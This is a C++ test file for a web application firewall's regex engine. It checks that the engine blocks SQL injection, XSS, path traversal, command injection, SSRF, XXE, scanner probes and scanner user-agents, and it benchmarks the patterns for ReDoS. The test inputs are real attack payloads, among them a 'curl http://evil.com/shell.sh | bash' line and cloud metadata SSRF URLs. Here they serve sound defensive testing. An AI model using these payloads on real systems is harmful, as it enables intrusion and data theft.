// tests/test_waf_regex.cc
// Unit tests + performance/ReDoS benchmark for WafRegexEngine
//
// Build (standalone, no CMake):
//   g++ -std=c++17 -O2 -o test_waf_regex test_waf_regex.cc -lpthread && ./test_waf_regex
//
// Or via CMake (add to tests/CMakeLists.txt):
//   add_executable(test_waf_regex test_waf_regex.cc)
//   target_include_directories(test_waf_regex PRIVATE ${PROJECT_SOURCE_DIR}/include)
//   target_link_libraries(test_waf_regex PRIVATE pthread)

// ── Stub for NW_WARN (not available outside server context) ──────────────────
#define NW_WARN(tag, fmt, ...) do {} while(0)

// ── Pull in the engine ───────────────────────────────────────────────────────
#define WAF_REGEX_IMPL          // suppress "extern g_waf_regex"
#include "../include/waf_regex.hh"

#include <cassert>
#include <chrono>
#include <cstdio>
#include <string>
#include <vector>

// ── Minimal test harness (matches style in test_cache.cc) ────────────────────
static int ok = 0, fail = 0, skip = 0;

#define CHK(cond, msg) \
    do { \
        if (cond) { ok++;   printf("  \xE2\x9C\x93 %s\n", msg); } \
        else       { fail++; printf("  \xE2\x9C\x97 FAIL: %s\n", msg); } \
    } while(0)

#define SECTION(name) printf("\n--- %s ---\n", name)

// ── Helper: call engine.check() for a simple GET with only path+query ────────
static bool waf_check(WafRegexEngine& e,
                       const std::string& path,
                       const std::string& query  = "",
                       const std::string& body   = "",
                       const std::string& headers = "")
{
    return e.check("1.2.3.4", "GET", path, query, body, headers);
}

// ────────────────────────────────────────────────────────────────────────────
// 1. Compile-time / initialisation
// ────────────────────────────────────────────────────────────────────────────
void test_compile()
{
    SECTION("Compile");
    WafRegexEngine e;
    e.compile();
    CHK(e.compiled,                  "engine marks itself compiled");
    CHK(!e.pattern_sets.empty(),     "pattern_sets populated");

    // Every expected category must be present
    std::vector<std::string> expected_cats = {
        "SQLi", "XSS", "PathTraversal", "CmdInjection", "SSRF", "XXE", "ScanProbe", "BadUA"
    };
    for (auto& cat : expected_cats) {
        bool found = false;
        for (auto& ps : e.pattern_sets)
            if (ps.category == cat) { found = true; break; }
        std::string msg = "category present: " + cat;
        CHK(found, msg.c_str());
    }
}

// ────────────────────────────────────────────────────────────────────────────
// 2. SQLi detection
// ────────────────────────────────────────────────────────────────────────────
void test_sqli()
{
    SECTION("SQLi – detection");
    WafRegexEngine e; e.compile();

    // Should BLOCK (return false)
    CHK(!waf_check(e, "/search", "q=1 OR 1=1"),                       "classic OR tautology");
    CHK(!waf_check(e, "/search", "q=1' OR '1'='1"),                   "string tautology");
    CHK(!waf_check(e, "/api",    "id=1 UNION SELECT username,password FROM users"), "UNION SELECT");
    CHK(!waf_check(e, "/page",   "id=1; DROP TABLE users"),            "stacked query DROP");
    CHK(!waf_check(e, "/",       "t=1' AND SLEEP(5)--"),              "blind timing SLEEP");
    CHK(!waf_check(e, "/",       "x=1 AND BENCHMARK(1000000,MD5(1))"), "blind timing BENCHMARK");
    CHK(!waf_check(e, "/",       "f=LOAD_FILE('/etc/passwd')"),        "LOAD_FILE");
    CHK(!waf_check(e, "/",       "x=1 INTO OUTFILE '/tmp/shell.php'"), "INTO OUTFILE");
    CHK(!waf_check(e, "/",       "x=0x41424344"),                      "hex literal evasion");
    CHK(!waf_check(e, "/",       "x=(SELECT pass FROM users)"),        "subquery injection");
    CHK(!waf_check(e, "/",       "x=1 AND information_schema.tables"), "information_schema probe");
}

void test_sqli_safe()
{
    SECTION("SQLi – false-positive guard");
    WafRegexEngine e; e.compile();

    // Should ALLOW (return true)
    CHK(waf_check(e, "/products",  "category=electronics"),   "normal category query");
    CHK(waf_check(e, "/api/user",  "name=Alice"),              "normal name param");
    CHK(waf_check(e, "/",          "msg=Hello+World"),         "URL-encoded space");
    CHK(waf_check(e, "/order",     "id=12345"),                "numeric id");
    CHK(waf_check(e, "/search",    "q=select+a+shirt"),        "select as English word");
}

// ────────────────────────────────────────────────────────────────────────────
// 3. XSS detection
// ────────────────────────────────────────────────────────────────────────────
void test_xss()
{
    SECTION("XSS – detection");
    WafRegexEngine e; e.compile();

    CHK(!waf_check(e, "/", "x=<script>alert(1)</script>"),             "<script> tag");
    CHK(!waf_check(e, "/", "cb=javascript:alert(1)"),                  "javascript: protocol");
    CHK(!waf_check(e, "/", "x=<img onerror=alert(1) src=x>"),          "onerror event handler");
    CHK(!waf_check(e, "/", "x=<iframe src=x>"),                        "iframe injection");
    CHK(!waf_check(e, "/", "x=eval(atob('YWxlcnQoMSk='))"),            "eval() call");
    CHK(!waf_check(e, "/", "x=document.cookie"),                        "document.cookie access");
    CHK(!waf_check(e, "/", "x=data:text/html,<script>alert(1)</script>"), "data: URI");
    CHK(!waf_check(e, "/", "x=%3cscript%3ealert%281%29%3c/script%3e"), "URL-encoded <script>");
}

void test_xss_safe()
{
    SECTION("XSS – false-positive guard");
    WafRegexEngine e; e.compile();

    CHK(waf_check(e, "/docs",      "q=JavaScript+tutorial"),  "JavaScript as search term");
    CHK(waf_check(e, "/api/html",  "x=<p>Hello</p>"),         "benign HTML paragraph");
}

// ────────────────────────────────────────────────────────────────────────────
// 4. Path Traversal
// ────────────────────────────────────────────────────────────────────────────
void test_path_traversal()
{
    SECTION("PathTraversal – detection");
    WafRegexEngine e; e.compile();

    CHK(!waf_check(e, "/files/../../../etc/passwd"),           "classic ../ traversal");
    CHK(!waf_check(e, "/", "f=..%2f..%2fetc%2fpasswd"),       "URL-encoded ../ in query");
    CHK(!waf_check(e, "/", "f=%252e%252e%252fetc"),            "double-encoded traversal");
    CHK(!waf_check(e, "/etc/passwd"),                          "/etc/passwd path");
    CHK(!waf_check(e, "/proc/self/environ"),                   "/proc/self traversal");
    CHK(!waf_check(e, "/", "p=C:\\windows\\system32"),         "Windows path traversal");
}

// ────────────────────────────────────────────────────────────────────────────
// 5. Command Injection
// ────────────────────────────────────────────────────────────────────────────
void test_cmd_injection()
{
    SECTION("CmdInjection – detection");
    WafRegexEngine e; e.compile();

    CHK(!waf_check(e, "/run", "cmd=; ls -la"),                 "semicolon + ls");
    CHK(!waf_check(e, "/",    "x=`id`"),                       "backtick execution");
    CHK(!waf_check(e, "/",    "x=$(whoami)"),                   "$(cmd) substitution");
    CHK(!waf_check(e, "/",    "x=| bash"),                     "pipe to bash");
    CHK(!waf_check(e, "/",    "x=; curl http://evil.com/shell.sh | bash"), "curl pipe bash");
    CHK(!waf_check(e, "/",    "x=; chmod 777 /etc/passwd"),    "chmod command");
    CHK(!waf_check(e, "/",    "x=system('id')"),               "PHP system()");
    CHK(!waf_check(e, "/",    "x=/bin/bash"),                  "/bin/bash path");
}

// ────────────────────────────────────────────────────────────────────────────
// 6. SSRF
// ────────────────────────────────────────────────────────────────────────────
void test_ssrf()
{
    SECTION("SSRF – detection");
    WafRegexEngine e; e.compile();

    CHK(!waf_check(e, "/fetch", "url=http://localhost/admin"),              "localhost SSRF");
    CHK(!waf_check(e, "/fetch", "url=http://127.0.0.1:8080/"),             "127.0.0.1 SSRF");
    CHK(!waf_check(e, "/fetch", "url=http://169.254.169.254/latest/meta-data"), "AWS metadata SSRF");
    CHK(!waf_check(e, "/fetch", "url=http://metadata.google.internal"),    "GCP metadata SSRF");
    CHK(!waf_check(e, "/fetch", "url=file:///etc/passwd"),                 "file:// protocol");
    CHK(!waf_check(e, "/fetch", "url=gopher://evil.com"),                  "gopher protocol");
    CHK(!waf_check(e, "/fetch", "url=http://10.0.0.1/admin"),              "private 10.x range");
    CHK(!waf_check(e, "/fetch", "url=http://192.168.1.1/router"),          "private 192.168 range");
    CHK(!waf_check(e, "/fetch", "url=http://user:pass@external.com"),      "credential in URL");
}

// ────────────────────────────────────────────────────────────────────────────
// 7. XXE
// ────────────────────────────────────────────────────────────────────────────
void test_xxe()
{
    SECTION("XXE – detection");
    WafRegexEngine e; e.compile();

    std::string xxe_body = R"(<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>)";
    CHK(!waf_check(e, "/api", "", xxe_body),                   "XXE ENTITY SYSTEM in body");

    std::string doctype_body = R"(<!DOCTYPE test [<!ENTITY x "hello">]>)";
    CHK(!waf_check(e, "/api", "", doctype_body),               "DOCTYPE with entity block");
}

// ────────────────────────────────────────────────────────────────────────────
// 8. Scanner/Probe detection
// ────────────────────────────────────────────────────────────────────────────
void test_scan_probe()
{
    SECTION("ScanProbe – detection");
    WafRegexEngine e; e.compile();

    CHK(!waf_check(e, "/wp-login.php"),                        "WordPress login probe");
    CHK(!waf_check(e, "/wp-admin/admin.php"),                  "WordPress admin probe");
    CHK(!waf_check(e, "/xmlrpc.php"),                          "WordPress xmlrpc probe");
    CHK(!waf_check(e, "/wp-config.php"),                       "wp-config.php exposure");
    CHK(!waf_check(e, "/.git/config"),                         ".git/config probe");
    CHK(!waf_check(e, "/.env"),                                ".env file probe");
    CHK(!waf_check(e, "/phpmyadmin/index.php"),               "phpMyAdmin probe");
    CHK(!waf_check(e, "/administrator/index.php"),             "Joomla admin probe");
    CHK(!waf_check(e, "/shell.php"),                           "webshell probe");
    CHK(!waf_check(e, "/actuator/heapdump"),                  "Spring Boot actuator probe");
    CHK(!waf_check(e, "/cgi-bin/admin.cgi"),                  "CGI admin probe");
}

// ────────────────────────────────────────────────────────────────────────────
// 9. Bad User-Agent
// ────────────────────────────────────────────────────────────────────────────
void test_bad_ua()
{
    SECTION("BadUA – detection");
    WafRegexEngine e; e.compile();

    auto check_ua = [&](const std::string& ua_val, const char* msg) {
        bool r = e.check("1.2.3.4", "GET", "/", "", "", "User-Agent: " + ua_val + "\r\n");
        CHK(!r, msg);
    };

    check_ua("sqlmap/1.7.2#stable",                              "sqlmap UA");
    check_ua("Nikto/2.1.6",                                      "Nikto UA");
    check_ua("Mozilla/5.0 (compatible; Nessus)",                 "Nessus UA");
    check_ua("gobuster/3.1.0",                                   "gobuster UA");
    check_ua("nuclei - Open-source project (github.com/projectdiscovery/nuclei)", "nuclei UA");
    check_ua("python-requests/2.28.1",                           "python-requests UA");
    check_ua("Scrapy/2.9.0 (+https://scrapy.org)",               "Scrapy UA");
}

void test_bad_ua_safe()
{
    SECTION("BadUA – false-positive guard");
    WafRegexEngine e; e.compile();

    auto allow_ua = [&](const std::string& ua_val, const char* msg) {
        bool r = e.check("1.2.3.4", "GET", "/", "", "", "User-Agent: " + ua_val + "\r\n");
        CHK(r, msg);
    };

    allow_ua("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Chrome Windows");
    allow_ua("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15", "Safari macOS");
    allow_ua("Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0", "Firefox Linux");
}

// ────────────────────────────────────────────────────────────────────────────
// 10. Detect-only mode (block_mode = false)
// ────────────────────────────────────────────────────────────────────────────
void test_detect_only_mode()
{
    SECTION("Detect-only mode");
    WafRegexEngine e; e.compile();
    e.cfg.block_mode = false;

    // Malicious input — should be ALLOWED (detect only, not blocked)
    bool r = waf_check(e, "/", "q=1 UNION SELECT * FROM users");
    CHK(r,  "detect-only: SQLi allowed through (not blocked)");
    CHK(e.total_detected.load() == 1, "detect-only: detection counter incremented");
    CHK(e.total_blocked.load()  == 0, "detect-only: block counter stays zero");
}

// ────────────────────────────────────────────────────────────────────────────
// 11. Engine disabled
// ────────────────────────────────────────────────────────────────────────────
void test_disabled()
{
    SECTION("Engine disabled");
    WafRegexEngine e; e.compile();
    e.cfg.enabled = false;

    CHK(waf_check(e, "/", "x=<script>alert(1)</script>"), "disabled: XSS allowed");
    CHK(waf_check(e, "/", "q=1 OR 1=1"),                  "disabled: SQLi allowed");
}

// ────────────────────────────────────────────────────────────────────────────
// 12. Counters and event log
// ────────────────────────────────────────────────────────────────────────────
void test_counters_and_events()
{
    SECTION("Counters & event log");
    WafRegexEngine e; e.compile();

    waf_check(e, "/clean");
    waf_check(e, "/clean2");
    CHK(e.total_checked.load() == 2,  "two clean requests counted");
    CHK(e.total_blocked.load() == 0,  "zero blocks so far");

    waf_check(e, "/", "x=<script>xss</script>");
    CHK(e.total_blocked.load() == 1,  "one block after XSS attempt");
    CHK(e.total_detected.load() == 1, "one detection recorded");

    {
        std::lock_guard<std::mutex> lk(e.events_mu);
        CHK(!e.events.empty(),          "event recorded in deque");
        CHK(e.events.back().category == "XSS", "event category is XSS");
    }

    e.clear_events();
    {
        std::lock_guard<std::mutex> lk(e.events_mu);
        CHK(e.events.empty(), "clear_events empties deque");
    }
}

// ────────────────────────────────────────────────────────────────────────────
// 13. out_category / out_detail output parameters
// ────────────────────────────────────────────────────────────────────────────
void test_out_params()
{
    SECTION("out_category / out_detail");
    WafRegexEngine e; e.compile();

    std::string cat, detail;
    bool r = e.check("1.2.3.4", "GET", "/", "id=1 UNION SELECT 1", "", "", &cat, &detail);
    CHK(!r,          "SQLi blocked");
    CHK(cat == "SQLi", ("out_category is SQLi, got: " + cat).c_str());
    CHK(!detail.empty(), "out_detail populated");
}

// ────────────────────────────────────────────────────────────────────────────
// 14. stats_json smoke test
// ────────────────────────────────────────────────────────────────────────────
void test_stats_json()
{
    SECTION("stats_json");
    WafRegexEngine e; e.compile();
    waf_check(e, "/", "q=1 OR 1=1");

    std::string j = e.stats_json();
    CHK(j.find("\"enabled\":true")    != std::string::npos, "json contains enabled");
    CHK(j.find("\"total_checked\"")   != std::string::npos, "json contains total_checked");
    CHK(j.find("\"total_blocked\"")   != std::string::npos, "json contains total_blocked");
    CHK(j.find("\"SQLi\"")            != std::string::npos, "json contains SQLi category");
}

// ────────────────────────────────────────────────────────────────────────────
// 15. URL-decode evasion (double-encoding, mixed case)
// ────────────────────────────────────────────────────────────────────────────
void test_url_decode_evasion()
{
    SECTION("URL-decode evasion");
    WafRegexEngine e; e.compile();

    // %3c = '<', %2f = '/', %3e = '>'  →  <script>
    CHK(!waf_check(e, "/", "x=%3cscript%3ealert(1)%3c%2fscript%3e"), "single-encoded <script>");
    // Double-encoded path traversal
    CHK(!waf_check(e, "/", "f=%252e%252e%252f"),                      "double-encoded ../");
}

// ────────────────────────────────────────────────────────────────────────────
// 16. Performance / ReDoS benchmark
//     Each pattern set is exercised with a "worst-case" string of 4096 chars.
//     A hard per-call timeout of 100 ms is enforced.
//     Any pattern set that exceeds the threshold is reported as a WARNING
//     (does not fail the test suite — detection accuracy is not affected —
//      but the output clearly marks it so you can prioritise fixes).
// ────────────────────────────────────────────────────────────────────────────
void benchmark_redos()
{
    SECTION("ReDoS / performance benchmark");

    WafRegexEngine e; e.compile();

    using Clock = std::chrono::steady_clock;
    using Ms    = std::chrono::duration<double, std::milli>;

    // Adversarial inputs: long strings that shouldn't match but exercise backtracking
    const std::vector<std::pair<std::string, std::string>> inputs = {
        { "SQLi",         std::string(4096, 'a') + " OR " + std::string(512, 'b') },
        { "XSS",          "<" + std::string(4096, 'a') + ">" },
        { "PathTraversal",std::string(4096, '.') + "/" + std::string(512, 'x') },
        { "CmdInjection", std::string(4096, '$') + "(" + std::string(512, 'y') + ")" },
        { "SSRF",         "http://" + std::string(4096, '1') + ".com/" },
        { "XXE",          "<!DOCTYPE" + std::string(4096, ' ') + "[" },
        { "ScanProbe",    "/" + std::string(4096, 'w') + ".php" },
        { "BadUA",        std::string(4096, 'M') + "sqlmap" + std::string(512, 'z') },
    };

    constexpr double THRESHOLD_MS = 100.0;
    bool any_slow = false;

    for (auto& [cat, input] : inputs) {
        // Find the pattern set
        WafRegexEngine::PatternSet* ps = nullptr;
        for (auto& p : e.pattern_sets)
            if (p.category == cat) { ps = &p; break; }
        if (!ps) { printf("  ? category not found: %s\n", cat.c_str()); continue; }

        auto t0 = Clock::now();
        std::smatch m;
        for (auto& pat : ps->patterns)
            std::regex_search(input, m, pat);
        double elapsed = Ms(Clock::now() - t0).count();

        if (elapsed > THRESHOLD_MS) {
            printf("  \xE2\x9A\xA0  SLOW [%s] %.1f ms  > threshold %.0f ms  ← potential ReDoS\n",
                   cat.c_str(), elapsed, THRESHOLD_MS);
            any_slow = true;
        } else {
            printf("  \xE2\x9C\x93  [%s] %.2f ms\n", cat.c_str(), elapsed);
            ok++;
        }
    }

    // Full engine check with a 4 KB benign string (no matches expected)
    std::string benign(4096, 'x');
    auto t0 = Clock::now();
    for (int i = 0; i < 1000; i++)
        e.check("127.0.0.1", "GET", "/search", "q=" + benign, "");
    double total_ms = Ms(Clock::now() - t0).count();
    double per_req  = total_ms / 1000.0;
    printf("\n  Full engine: 1000 x 4KB benign = %.1f ms total  (%.3f ms/req)\n",
           total_ms, per_req);

    if (per_req < 1.0) {
        printf("  \xE2\x9C\x93  Throughput acceptable (< 1 ms/req)\n");
        ok++;
    } else {
        printf("  \xE2\x9A\xA0  Throughput WARNING: %.3f ms/req (threshold 1 ms)\n", per_req);
        any_slow = true;
    }

    if (any_slow) {
        printf("\n  NOTE: Slow patterns detected. Consider:\n");
        printf("    1. Replace std::regex with RE2 (linear-time guarantees)\n");
        printf("    2. Rewrite possessive quantifiers / atomic groups manually\n");
        printf("    3. Add input-length cap before regex (cfg.max_body_check already does this for body)\n");
    }
}

// ────────────────────────────────────────────────────────────────────────────
// main
// ────────────────────────────────────────────────────────────────────────────
int main()
{
    printf("=== WafRegexEngine tests ===\n");

    test_compile();

    test_sqli();
    test_sqli_safe();

    test_xss();
    test_xss_safe();

    test_path_traversal();
    test_cmd_injection();
    test_ssrf();
    test_xxe();
    test_scan_probe();

    test_bad_ua();
    test_bad_ua_safe();

    test_detect_only_mode();
    test_disabled();
    test_counters_and_events();
    test_out_params();
    test_stats_json();
    test_url_decode_evasion();

    benchmark_redos();

    printf("\n==========================================\n");
    printf("  %d passed,  %d failed,  %d skipped\n", ok, fail, skip);
    printf("==========================================\n");
    return fail > 0 ? 1 : 0;
}
